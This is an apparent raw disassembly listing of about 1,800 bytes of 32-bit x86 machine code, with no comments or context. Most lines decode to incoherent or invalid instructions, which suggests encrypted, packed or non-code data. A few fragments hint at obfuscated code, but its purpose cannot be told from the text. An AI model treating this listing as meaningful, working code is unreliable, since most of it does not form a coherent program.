  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x2dfc0c59
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c893
  40c8c7:	sbb    ah,BYTE PTR [ebp-0x4371a578]
  40c8cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8ce:	push   ebx
  40c8cf:	mov    ds:0x392bac9c,al
  40c8d4:	push   DWORD PTR [eax+ecx*2]
  40c8d7:	outs   dx,DWORD PTR ds:[esi]
  40c8d8:	fisttp DWORD PTR [eax+0x5e]
  40c8db:	bound  eax,QWORD PTR [edi]
  40c8dd:	inc    esp
  40c8de:	mov    esp,0x360a1327
  40c8e3:	and    eax,0x15206685
  40c8e8:	rol    al,0x15
  40c8eb:	pop    ss
  40c8ec:	and    ebx,ebx
  40c8ee:	sbb    ah,BYTE PTR [edx+0x68ef204c]
  40c8f4:	mov    eax,0xca36ea7e
  40c8fa:	or     eax,0xe09bc973
  40c8ff:	das    
  40c900:	sbb    ecx,ebx
  40c902:	ds fwait
  40c904:	test   ecx,0x41ebaebf
  40c90a:	in     al,0xf0
  40c90c:	retf   
  40c90d:	fwait
  40c90e:	ss sbb eax,0x423ac688
  40c914:	inc    esp
  40c915:	sbb    ebx,eax
  40c917:	add    al,BYTE PTR [eax]
  40c919:	mov    ds:0xc6a66d28,eax
  40c91e:	in     eax,0xaa
  40c920:	aam    0x15
  40c922:	dec    ebp
  40c923:	outs   dx,DWORD PTR ds:[esi]
  40c924:	push   eax
  40c925:	popf   
  40c926:	scas   al,BYTE PTR es:[edi]
  40c927:	xor    BYTE PTR [edx+0x5d916061],ah
  40c92d:	bound  edi,QWORD PTR [ecx+0x4f]
  40c930:	push   ebp
  40c931:	lock mov eax,0x290c2b32
  40c937:	cli    
  40c938:	lds    ebp,FWORD PTR [eax]
  40c93a:	dec    esi
  40c93b:	mov    WORD PTR [eax],es
  40c93d:	mov    dl,0xee
  40c93f:	rol    BYTE PTR [edi-0x5c4f36ce],0xd5
  40c946:	jne    0x40c988
  40c948:	xor    dh,BYTE PTR [esi+ebx*2-0x5f2f510f]
  40c94f:	jae    0x40c9b3
  40c951:	mov    edi,0xfc2111c0
  40c956:	mov    ds,esp
  40c958:	mov    ebx,0x39a54e11
  40c95d:	daa    
  40c95e:	rol    DWORD PTR [ebx],cl
  40c960:	gs int3 
  40c962:	sub    dh,BYTE PTR [ebx]
  40c964:	cdq    
  40c965:	aam    0x67
  40c967:	mov    BYTE PTR [ebx-0x7f078202],ch
  40c96d:	daa    
  40c96e:	xchg   esi,eax
  40c96f:	jle    0x40c983
  40c971:	and    DWORD PTR [eax+0x454c18ac],edx
  40c977:	jg     0x40c9e4
  40c979:	mov    edx,?
  40c97b:	sbb    al,0xc4
  40c97d:	leave  
  40c97e:	shl    DWORD PTR [ecx-0x226b3f27],0x5
  40c985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c986:	daa    
  40c987:	mov    ds:0xdee1b4cb,eax
  40c98c:	dec    ebx
  40c98d:	mov    ebp,0x78d26297
  40c992:	xor    al,0x3d
  40c994:	cdq    
  40c995:	jnp    0x40c98e
  40c997:	xor    DWORD PTR [ecx+0x76],ecx
  40c99a:	push   0xb4b519c0
  40c99f:	mov    DWORD PTR [eax-0x7f],edi
  40c9a2:	jecxz  0x40c936
  40c9a4:	aad    0xb
  40c9a6:	jae    0x40c950
  40c9a8:	popa   
  40c9a9:	mov    WORD PTR [esi-0x4c7802],fs
  40c9af:	ins    DWORD PTR es:[di],dx
  40c9b1:	inc    edi
  40c9b2:	sar    ebx,1
  40c9b4:	xor    al,BYTE PTR [esi-0x27]
  40c9b7:	adc    BYTE PTR [ecx],bl
  40c9b9:	mov    dh,BYTE PTR [edi-0x74]
  40c9bc:	jb     0x40c94d
  40c9be:	mov    dh,0xbf
  40c9c0:	retf   
  40c9c1:	push   cs
  40c9c2:	(bad)  
  40c9c3:	jae    0x40c9a7
  40c9c5:	int3   
  40c9c6:	(bad)  
  40c9c7:	mov    WORD PTR [esi+0x6],?
  40c9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9cb:	call   0xfbb2:0x21cffa0c
  40c9d2:	pusha  
  40c9d3:	dec    edi
  40c9d4:	mov    BYTE PTR [ecx],bh
  40c9d6:	mov    cl,BYTE PTR [edx+0x3097479f]
  40c9dc:	out    0x8c,al
  40c9de:	mov    al,0x17
  40c9e0:	jp     0x40ca17
  40c9e2:	push   eax
  40c9e3:	cdq    
  40c9e4:	rcl    BYTE PTR [esi-0x39],cl
  40c9e7:	dec    ecx
  40c9e8:	or     esi,DWORD PTR [eax]
  40c9ea:	jo     0x40c9f9
  40c9ec:	add    DWORD PTR [ecx+eax*1],0x18
  40c9f0:	add    ch,BYTE PTR [ecx+0x5f8579d2]
  40c9f6:	mov    ebp,0xc62866e6
  40c9fb:	fcomp  DWORD PTR [di-0x45]
  40c9ff:	push   edi
  40ca00:	(bad)  
  40ca01:	adc    DWORD PTR [ebp-0x408a0895],ebp
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x92a9b3cf
  40ca1c:	int    0x48
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40c9e4
  40ca26:	mov    dh,0x59
  40ca28:	cmp    eax,DWORD PTR [ebx+0x254424a7]
  40ca2e:	mov    ?,WORD PTR [esi-0x6a]
  40ca31:	aad    0xd
  40ca33:	rol    bh,1
  40ca35:	int    0x8c
  40ca37:	lock push 0xfffffff3
  40ca3a:	and    al,0x14
  40ca3c:	mov    edi,0x1bf7d61e
  40ca41:	xor    DWORD PTR [edi-0x17],0xfffffff8
  40ca45:	sbb    eax,DWORD PTR [eax+0x141b628b]
  40ca4b:	xor    eax,0xe3906cde
  40ca50:	shr    DWORD PTR [edx+0x19f09542],cl
  40ca56:	stos   BYTE PTR es:[edi],al
  40ca57:	ss repnz in eax,dx
  40ca5a:	dec    esi
  40ca5b:	adc    ch,dh
  40ca5d:	push   edx
  40ca5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca5f:	add    eax,edx
  40ca61:	(bad)  
  40ca62:	sub    bh,dh
  40ca64:	mov    bl,0xc7
  40ca66:	sub    DWORD PTR [esi*1+0x14f290fe],esi
  40ca6d:	js     0x40ca81
  40ca6f:	in     eax,dx
  40ca70:	mov    cl,0xff
  40ca72:	inc    eax
  40ca73:	jae    0x40ca82
  40ca75:	cmp    DWORD PTR [eax-0x47],ebx
  40ca78:	in     eax,dx
  40ca79:	jno    0x40ca7b
  40ca7b:	stos   DWORD PTR es:[edi],eax
  40ca7c:	push   es
  40ca7d:	call   0x242cf643
  40ca82:	jo     0x40ca64
  40ca84:	aam    0x95
  40ca86:	push   edi
  40ca87:	in     eax,dx
  40ca88:	jl     0x40caa2
  40ca8a:	mov    edi,0x669eaa70
  40ca8f:	icebp  
  40ca90:	cdq    
  40ca91:	or     DWORD PTR [ebp+0x46],0x32c1dcd2
  40ca98:	aaa    
  40ca99:	and    esi,DWORD PTR [eax-0x55]
  40ca9c:	out    0x8d,al
  40ca9e:	jns    0x40ca9b
  40caa0:	das    
  40caa1:	adc    bl,ch
  40caa3:	js     0xe573cbbe
  40caa9:	adc    BYTE PTR [edi-0x7ae960eb],ah
  40caaf:	dec    esi
  40cab0:	push   edx
  40cab1:	mov    DWORD PTR [ebp-0x73e0e2c4],esp
  40cab7:	or     edi,DWORD PTR [ebp+0x43afab76]
  40cabd:	inc    edi
  40cabe:	lds    edi,FWORD PTR [ebx+0x2e68f0a8]
  40cac4:	in     al,dx
  40cac5:	(bad)  
  40cac6:	ins    DWORD PTR es:[edi],dx
  40cac7:	mov    ebx,0x339e2912
  40cacc:	mov    ch,0xf4
  40cace:	arpl   dx,ax
  40cad0:	dec    esp
  40cad1:	not    BYTE PTR [edx+0x35]
  40cad4:	out    0x19,al
  40cad6:	out    dx,al
  40cad7:	or     edi,DWORD PTR [ecx-0x7]
  40cada:	or     DWORD PTR [ebx+ebx*2+0x1d03e3e1],0x1e
  40cae2:	jle    0x40cace
  40cae4:	pop    esi
  40cae5:	push   es
  40cae6:	ins    BYTE PTR es:[edi],dx
  40cae7:	ret    0xe7ee
  40caea:	push   esp
  40caeb:	lahf   
  40caec:	push   0xffffffd6
  40caee:	test   al,0x3c
  40caf0:	fadd   st,st(6)
  40caf2:	lds    ebp,FWORD PTR [ecx]
  40caf4:	es mov edx,0x364ca51a
  40cafa:	mov    ecx,0x85b131a3
  40caff:	icebp  
  40cb00:	fst    QWORD PTR [esi-0x29]
  40cb03:	mov    cl,0x2c
  40cb05:	icebp  
  40cb06:	fdivr  DWORD PTR [ebx-0x6b]
  40cb09:	ret    
  40cb0a:	pop    ebp
  40cb0b:	push   ds
  40cb0c:	fdiv   DWORD PTR [ecx+0x47]
  40cb0f:	imul   ecx,esp,0x71f7e87a
  40cb15:	sbb    ch,BYTE PTR [ecx]
  40cb17:	(bad)  
  40cb19:	inc    ecx
  40cb1a:	cld    
  40cb1b:	sbb    bh,BYTE PTR [ebp+0x1f]
  40cb1e:	(bad)
  40cb21:	push   ss
  40cb22:	aad    0x7d
  40cb24:	push   ebx
  40cb25:	sti    
  40cb26:	mov    edi,0x52bd0c69
  40cb2b:	call   0x49f4:0xf674074c
  40cb32:	mov    ebp,0xbb39f457
  40cb37:	mov    cl,0x2e
  40cb39:	ret    0x83
  40cb3c:	jp     0x40cacd
  40cb3e:	mov    dh,0xdf
  40cb40:	and    BYTE PTR [edx],0x1f
  40cb43:	cwde   
  40cb44:	repnz push eax
  40cb46:	popf   
  40cb47:	outs   dx,DWORD PTR ds:[esi]
  40cb48:	or     BYTE PTR [edx-0x5a9233f4],cl
  40cb4e:	mov    eax,0x395d2fca
  40cb53:	test   eax,0x5cbe73c8
  40cb58:	mov    ah,BYTE PTR [ebp+0x2904a77b]
  40cb5e:	push   ss
  40cb5f:	fwait
  40cb60:	sub    DWORD PTR [edx+0x69],esp
  40cb63:	mov    ch,0xe6
  40cb65:	outs   dx,BYTE PTR ds:[esi]
  40cb66:	pop    ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb8b
  40cb8b:	mov    edx,0xf6096ff5
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb4b
  40cb97:	mov    ebx,0x11838cb9
  40cb9c:	pop    ds
  40cb9d:	(bad)  
  40cb9e:	xor    esi,DWORD PTR [ecx+0x69102bf0]
  40cba4:	std    
  40cba5:	vpmadcswd xmm0,xmm0,xmm3,XMMWORD PTR [eax]
  40cbab:	dec    ebp
  40cbac:	gs push es
  40cbae:	or     dh,BYTE PTR [edi]
  40cbb0:	pop    edi
  40cbb1:	push   ss
  40cbb2:	mov    bl,0x26
  40cbb4:	push   edi
  40cbb5:	xlat   BYTE PTR ds:[ebx]
  40cbb6:	arpl   bx,cx
  40cbb8:	xchg   ecx,eax
  40cbb9:	dec    ebp
  40cbba:	int    0xa9
  40cbbc:	adc    DWORD PTR [ecx+ebx*1],edx
  40cbbf:	cmp    ecx,0x93a38ce3
  40cbc5:	push   ebx
  40cbc6:	sbb    eax,ecx
  40cbc8:	(bad)  
  40cbc9:	rol    BYTE PTR [eax-0x60527a75],1
  40cbcf:	out    dx,eax
  40cbd0:	sbb    esi,DWORD PTR [ebx-0x46]
  40cbd3:	mov    edi,0x8c9746d3
  40cbd8:	fldenv [edi-0x80]
  40cbdb:	mov    bh,0xe3
  40cbdd:	xor    edi,DWORD PTR [eax-0x4e]
  40cbe0:	sub    al,0xde
  40cbe2:	jge    0x40cb6f
  40cbe4:	mov    bh,0x34
  40cbe6:	mov    ds:0x83fcb79c,eax
  40cbeb:	cmp    bl,ch
  40cbed:	jbe    0x40cc47
  40cbef:	imul   esp,DWORD PTR [esi-0x54fa4bbd],0xfffffff7
  40cbf6:	clc    
  40cbf7:	xor    ah,BYTE PTR ds:0x367213f2
  40cbfd:	iret   
  40cbfe:	lods   al,BYTE PTR ds:[esi]
  40cbff:	jmp    0xd067:0x673621e0
  40cc06:	xor    edx,eax
  40cc08:	stc    
  40cc09:	push   edx
  40cc0a:	ret    0x4d6c
  40cc0d:	xchg   edx,eax
  40cc0e:	dec    eax
  40cc0f:	jp     0x40cb9a
  40cc11:	lock inc edx
  40cc13:	cdq    
  40cc14:	jne    0x40cc5c
  40cc16:	mov    edx,0x9ab43c69
  40cc1b:	(bad)  
  40cc1c:	mov    esp,0x3c33bc76
  40cc21:	es dec edi
  40cc23:	ins    BYTE PTR es:[edi],dx
  40cc24:	mov    dl,0x89
  40cc26:	push   cs
  40cc27:	xchg   ebx,eax
  40cc28:	sbb    DWORD PTR [ebx],ebx
  40cc2a:	xor    edx,DWORD PTR [ebp+eiz*1+0x7cf1316]
  40cc31:	sbb    DWORD PTR [edi-0x68f45eb6],esi
  40cc37:	popf   
  40cc38:	scas   eax,DWORD PTR es:[edi]
  40cc39:	out    dx,al
  40cc3a:	jecxz  0x40cc87
  40cc3c:	stos   BYTE PTR es:[edi],al
  40cc3d:	pop    ds
  40cc3e:	xchg   ebx,eax
  40cc3f:	(bad)
  40cc42:	sbb    ch,ah
  40cc44:	clc    
  40cc45:	cmp    BYTE PTR [ebp+0x7eb36d8e],cl
  40cc4b:	xchg   ebx,eax
  40cc4c:	jecxz  0x40cbf9
  40cc4e:	rcr    bl,0x98
  40cc51:	rcr    DWORD PTR [ebp*4-0x6b75a8],1
  40cc58:	mov    edi,0x2204abc9
  40cc5d:	cmp    BYTE PTR [edi-0x2d],dl
  40cc60:	pop    cx
  40cc62:	arpl   si,ax
  40cc64:	mov    esi,DWORD PTR [esi+eax*2]
  40cc67:	mov    eax,ds:0xa1a65b13
  40cc6c:	pop    es
  40cc6d:	dec    esi
  40cc6e:	jns    0x40cbfb
  40cc70:	call   0x168258f7
  40cc75:	ins    DWORD PTR es:[edi],dx
  40cc76:	mov    ecx,0x7e86b292
  40cc7b:	outs   dx,DWORD PTR ds:[esi]
  40cc7c:	and    eax,0xe1084ce6
  40cc81:	or     bl,dl
  40cc83:	dec    esi
  40cc84:	cli    
  40cc85:	imul   eax,DWORD PTR [esi+0x14],0x4de4c6f8
  40cc8c:	xchg   ebp,eax
  40cc8d:	xchg   edx,eax
  40cc8e:	ds aam 0x87
  40cc91:	cmp    dl,BYTE PTR [ecx-0xe91d7a5]
  40cc97:	mov    bl,0x74
  40cc99:	push   esi
  40cc9a:	(bad)  
  40cc9b:	mov    ebp,0xa0cef820
  40cca0:	sub    ah,al
  40cca2:	inc    esp
  40cca3:	xchg   ebx,eax
  40cca4:	js     0x40ccb0
  40cca6:	jecxz  0x40cc79
  40cca8:	repz cmp DWORD PTR [eax-0x23a7e122],0x7a662a2d
  40ccb3:	fimul  WORD PTR cs:[esi+ebp*2-0x52c7cf30]
  40ccbb:	mov    ebp,0xc18bd1a2
  40ccc0:	inc    edx
  40ccc1:	in     al,0x65
  40ccc3:	jno    0x40cc5a
  40ccc5:	cmp    ebx,eax
  40ccc7:	cmp    al,0xfe
  40ccc9:	out    dx,eax
  40ccca:	fild   WORD PTR [edi-0x3a]
  40cccd:	das    
  40ccce:	or     BYTE PTR [ebp-0x6a],al
  40ccd1:	pop    esi
  40ccd2:	xor    eax,eax
  40ccd4:	call   0x45cc2706
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xacec1d3a
  40ccf1:	je     0x40ccf8
  40ccf3:	push   esp
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd5d
  40ccfd:	ficom  DWORD PTR [eax+ebx*1-0x42]
  40cd01:	mov    eax,ds:0xf4f0f6bd
  40cd06:	test   DWORD PTR [ecx],eax
  40cd08:	push   edi
  40cd09:	inc    esi
  40cd0a:	push   esp
  40cd0b:	pop    ecx
  40cd0c:	pop    ebp
  40cd0d:	hlt    
  40cd0e:	rcl    ebp,0xc0
  40cd11:	push   0x37
  40cd13:	cmp    al,0x72
  40cd15:	push   0x70
  40cd17:	push   cs
  40cd18:	adc    DWORD PTR [esi-0x71b3ee2b],esi
  40cd1e:	mov    dh,0x26
  40cd20:	outs   dx,DWORD PTR ds:[esi]
  40cd21:	mov    bh,0x45
  40cd23:	sbb    eax,0xd2efbb9e
  40cd28:	add    al,0xfa
  40cd2a:	push   es
  40cd2b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd2d:	adc    DWORD PTR [eax+0x49],edx
  40cd30:	shl    ah,1
  40cd32:	sahf   
  40cd33:	sub    eax,0x2525147f
  40cd38:	icebp  
  40cd39:	in     al,0xeb
  40cd3b:	dec    esp
  40cd3c:	cli    
  40cd3d:	icebp  
  40cd3e:	pop    ebp
  40cd3f:	dec    ebx
  40cd40:	call   DWORD PTR [edi]
  40cd42:	(bad)  
  40cd43:	(bad)  
  40cd44:	dec    edx
  40cd45:	(bad)  
  40cd46:	aad    0x70
  40cd48:	xchg   esp,eax
  40cd49:	xchg   esp,eax
  40cd4a:	or     edi,esp
  40cd4c:	ret    
  40cd4d:	mov    DWORD PTR [eax+0xf],edi
  40cd50:	clc    
  40cd51:	imul   ecx,DWORD PTR [ebp+0x34424a29],0x2e50824b
  40cd5b:	xchg   BYTE PTR [ebx+0x30],ah
  40cd5e:	xchg   esp,eax
  40cd5f:	stos   BYTE PTR es:[edi],al
  40cd60:	aaa    
  40cd61:	adc    bl,0x5a
  40cd64:	mov    bh,0xb2
  40cd66:	dec    ebp
  40cd67:	sbb    dl,BYTE PTR [edx]
  40cd69:	adc    al,0xee
  40cd6b:	add    eax,0x6bc1b1e4
  40cd70:	(bad)  
  40cd71:	pop    esp
  40cd72:	pop    esi
  40cd73:	xchg   esp,eax
  40cd74:	mov    bl,0x9b
  40cd76:	sub    edx,DWORD PTR ds:0x39cc7dea
  40cd7c:	ds fs out 0xc4,al
  40cd80:	shl    BYTE PTR cs:[ebx+0x27],1
  40cd84:	adc    al,0xa3
  40cd86:	adc    ah,BYTE PTR [edi+0x22]
  40cd89:	test   al,0x2
  40cd8b:	iret   
  40cd8c:	(bad)  
  40cd8d:	leave  
  40cd8e:	push   esp
  40cd8f:	mov    dl,0x9b
  40cd91:	(bad)  
  40cd92:	jnp    0x40cda1
  40cd94:	mov    ebx,0xa3757ab
  40cd99:	fwait
  40cd9a:	push   esp
  40cd9b:	in     al,0x13
  40cd9d:	fistp  QWORD PTR [ebx]
  40cd9f:	push   0x1af27e6b
  40cda4:	ds sub esp,ebx
  40cda7:	jno    0x40cdff
  40cda9:	sbb    DWORD PTR [edi],edx
  40cdab:	inc    ebx
  40cdac:	mov    BYTE PTR gs:[ecx-0x7f5b36bb],cl
  40cdb3:	aaa    
  40cdb4:	xchg   esi,eax
  40cdb5:	je     0x40cd56
  40cdb7:	stos   DWORD PTR es:[edi],eax
  40cdb8:	jmp    0x9027:0x95c2a051
  40cdbf:	aas    
  40cdc0:	push   esp
  40cdc1:	mov    ebx,0x9a317b25
  40cdc6:	adc    al,0x94
  40cdc8:	xchg   al,bh
  40cdca:	(bad)  
  40cdcb:	mov    DWORD PTR [eax+ebx*4-0x5a3594d1],ebx
  40cdd2:	dec    ebx
  40cdd3:	clc    
  40cdd4:	xor    al,0xd1
  40cdd6:	das    
  40cdd7:	inc    esi
  40cdd8:	add    esi,DWORD PTR [ecx-0xd845a43]
  40cdde:	cld    
  40cddf:	lock bound ecx,QWORD PTR [ecx+0x62]
  40cde3:	dec    edi
  40cde4:	dec    ebx
  40cde5:	push   cs
  40cde6:	adc    DWORD PTR [ecx],0xb87b11e2
  40cdec:	imul   esp,DWORD PTR [edi],0xecb20504
  40cdf2:	mov    al,gs:0x704e907b
  40cdf8:	mov    ds:0x9b1ab5db,al
  40cdfd:	sbb    al,0xc3
  40cdff:	mov    ds:0xfb1a81aa,eax
  40ce04:	sub    edi,DWORD PTR [ecx-0x7a]
  40ce07:	xchg   ebx,eax
  40ce08:	add    dl,ah
  40ce0a:	stos   DWORD PTR es:[edi],eax
  40ce0b:	aaa    
  40ce0c:	inc    ebp
  40ce0d:	sbb    ah,bl
  40ce0f:	fs cmp DWORD PTR fs:[edi],esp
  40ce13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce14:	repz or al,0x1e
  40ce17:	iret   
  40ce18:	pop    ds
  40ce19:	das    
  40ce1a:	mov    ch,0xda
  40ce1c:	cmp    dl,BYTE PTR [ebp-0xdd0a2e5]
  40ce22:	idiv   DWORD PTR [edi]
  40ce24:	dec    ecx
  40ce25:	or     ebx,DWORD PTR [edx-0x63fbb78e]
  40ce2b:	mov    dh,0x94
  40ce2d:	push   esp
  40ce2e:	test   DWORD PTR [ecx],eax
  40ce30:	mov    ch,0xf7
  40ce32:	mov    dh,0xa7
  40ce34:	(bad)  
  40ce35:	push   0x875fb769
  40ce3a:	inc    eax
  40ce3b:	aas    
  40ce3c:	sub    al,0x33
  40ce3e:	sar    DWORD PTR [edx+0x32729d],0x3
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x7f265331,eax
  40ce59:	ror    BYTE PTR [ebx+0x7e7e888b],0x3f
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ce0f
  40ce64:	xor    BYTE PTR [eax],0x5d
  40ce67:	pushf  
  40ce68:	xor    al,0xb
  40ce6a:	int    0xa6
  40ce6c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce6e:	inc    ecx
  40ce6f:	repz xchg ebx,eax
  40ce71:	arpl   WORD PTR [eax],sp
  40ce73:	mov    ebp,0x4e22ea3b
  40ce78:	pop    esi
  40ce79:	test   al,0x3e
  40ce7b:	bt     DWORD PTR [esi+0x36],edx
  40ce7f:	add    ch,BYTE PTR [ebx+0x6c]
  40ce82:	jno    0x40ce59
  40ce84:	in     al,dx
  40ce85:	lea    esp,[esi]
  40ce87:	int    0x69
  40ce89:	in     eax,dx
  40ce8a:	(bad)  
  40ce8b:	jo     0x40ceb0
  40ce8d:	mov    ds:0x3c972e14,al
  40ce92:	add    ah,dh
  40ce94:	pop    edx
  40ce95:	cdq    
  40ce96:	sub    DWORD PTR [edx+0x6f],edi
  40ce99:	(bad)  
  40ce9a:	cs out dx,al
  40ce9c:	fistp  QWORD PTR [bx+si]
  40ce9f:	xor    DWORD PTR ds:0xe0591095,esp
  40cea5:	test   BYTE PTR [ebx-0x2b8d6fad],dl
  40ceab:	push   eax
  40ceac:	cmp    bh,bh
  40ceae:	pop    esi
  40ceaf:	xchg   BYTE PTR cs:0xcb961c97,bh
  40ceb6:	dec    ebp
  40ceb7:	push   ecx
  40ceb8:	jl     0x40ce55
  40ceba:	sub    al,0xa1
  40cebc:	pushf  
  40cebd:	(bad)  
  40cebe:	je     0x40cf1d
  40cec0:	stos   DWORD PTR es:[edi],eax
  40cec1:	inc    edx
  40cec2:	pop    es
  40cec3:	fidivr DWORD PTR [ebx-0x799e8f4]
  40cec9:	call   0xb0bf:0x90f222ca
  40ced0:	outs   dx,DWORD PTR ds:[esi]
  40ced1:	jae    0x40ceaf
  40ced3:	mov    ds:0x23acde63,al
  40ced8:	addr16 int 0x33
  40cedb:	dec    eax
  40cedc:	jle    0x40ce78
  40cede:	xchg   DWORD PTR [ebx],eax
  40cee0:	xor    al,0x20
  40cee2:	jmp    0xb736:0xff2905b6
  40cee9:	add    ebx,DWORD PTR [bx-0x75]
  40ceed:	out    0x2c,al
  40ceef:	test   dl,bl
  40cef1:	inc    esp
  40cef2:	jle    0x40cec4
  40cef4:	test   al,0x42
  40cef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cef7:	mov    ebp,0x5c5339c1
  40cefc:	dec    edi
  40cefd:	aad    0xe4
  40ceff:	sbb    edi,DWORD PTR [edi+0x2fc9cb25]
  40cf05:	adc    ah,ah
  40cf07:	ret    
  40cf08:	mov    al,ds:0x1d1ff307
  40cf0d:	cwde   
  40cf0e:	jg     0x40cf40
  40cf10:	mov    cl,0xb9
  40cf12:	sub    ecx,DWORD PTR [ebx+0x13]
  40cf15:	xchg   esp,eax
  40cf16:	mov    dl,0xc2
  40cf18:	mov    edx,0x5c640b4a
  40cf1d:	retf   
  40cf1e:	(bad)  
  40cf1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf20:	mov    ds:0xb1adac00,al
  40cf25:	cmp    BYTE PTR [ecx],cl
  40cf27:	jge    0x40cf14
  40cf29:	inc    ecx
  40cf2a:	pop    es
  40cf2b:	ds test al,0xab
  40cf2e:	lea    ebx,[ebx+eiz*4+0x58]
  40cf32:	pop    eax
  40cf33:	jge    0x40cf1e
  40cf35:	push   edi
  40cf36:	pop    ebp
  40cf37:	adc    ch,BYTE PTR [edx-0x33]
  40cf3a:	xor    ch,BYTE PTR [ebp+0x32]
  40cf3d:	ret    
  40cf3e:	push   0x31
  40cf40:	push   es
  40cf41:	outs   dx,DWORD PTR ds:[esi]
  40cf42:	gs aaa 
  40cf44:	or     al,0x59
  40cf46:	rep lods eax,DWORD PTR ds:[esi]
  40cf48:	lods   eax,DWORD PTR ds:[esi]
  40cf49:	and    al,0x34
  40cf4b:	or     al,0xf0
  40cf4d:	xchg   DWORD PTR [esp+ecx*4+0x44],esp
  40cf51:	cmp    ebx,DWORD PTR [edi-0x5d2c5ef2]
  40cf57:	jecxz  0x40cf45
  40cf59:	(bad)  
  40cf5a:	daa    
  40cf5b:	fs cmp esi,ebp
  40cf5e:	inc    esi
  40cf5f:	lods   al,BYTE PTR ds:[esi]
  40cf60:	pop    esp
  40cf61:	into   
  40cf62:	nop
  40cf63:	repnz fild QWORD PTR [eax-0x6b]
  40cf67:	in     al,0x2f
  40cf69:	cli    
  40cf6a:	mov    DWORD PTR [ebx],eax
  40cf6c:	js     0x40cf11
  40cf6e:	dec    ecx
  40cf6f:	sub    edi,DWORD PTR [esi+0x5c7daf2d]
  40cf75:	push   ebp
  40cf76:	fwait
  40cf77:	pop    esi
  40cf78:	pusha  
  40cf79:	(bad)  
  40cf7a:	pop    ebx
  40cf7b:	xchg   edi,eax
  40cf7d:	cmp    BYTE PTR ds:0xe19efc16,0x50
  40cf84:	js     0x40cf85
  40cf86:	loop   0x40cf4f
  40cf88:	sbb    al,0x7b
  40cf8a:	fisttp DWORD PTR [eax]
  40cf8c:	push   ecx
  40cf8d:	adc    DWORD PTR [edi],0x13ee7a7c
  40cf93:	repz sbb BYTE PTR [ecx-0x1c5e000d],0xfa
  40cf9b:	dec    edi
  40cf9c:	test   BYTE PTR [esi+0x7d9b3e1c],ah
  40cfa2:	or     DWORD PTR [edx],ecx
  40cfa4:	mov    DWORD PTR [ebp+0x8],eax
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc9:	sbb    dh,al
  40cfcb:	mov    edi,0x7e7e894c
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40d022
  40cfd5:	mov    ds:0x4687b3f2,al
  40cfda:	test   al,0xcd
  40cfdc:	ret    
  40cfdd:	and    eax,0x58efd3a6
  40cfe2:	aad    0x61
  40cfe4:	mov    DWORD PTR [ebp+0x17b994e4],esp
  40cfea:	jmp    0x40d055
  40cfec:	cmc    
  40cfed:	sbb    BYTE PTR [ecx],bh
  40cfef:	inc    esi
  40cff0:	inc    ecx
  40cff1:	jns    0x40cf98
  40cff3:	(bad)  
  40cff4:	jmp    0x40d04f
  40cff6:	je     0x40cfab
  40cff8:	pop    ebx
  40cff9:	js     0x40cf83
  40cffb:	mov    esi,DWORD PTR [edx]
  40cffd:	lods   eax,DWORD PTR ds:[esi]
  40cffe:	xchg   BYTE PTR [eax-0xfca035c],dl
